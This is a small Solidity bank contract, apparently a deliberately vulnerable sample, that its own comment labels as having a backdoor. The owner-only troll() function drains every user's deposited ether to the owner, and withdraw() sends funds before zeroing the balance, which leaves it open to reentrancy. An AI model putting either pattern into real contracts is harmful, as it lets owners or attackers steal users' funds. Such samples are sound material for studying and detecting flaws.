// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;


// Bank with simple backdoor with onlyOwner
contract MyBank {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function troll() public onlyOwner {
        uint256 total = address(this).balance;
        (bool sent,) = msg.sender.call{value: total}("");
        require(sent, "Failed to send Ether");
    }
}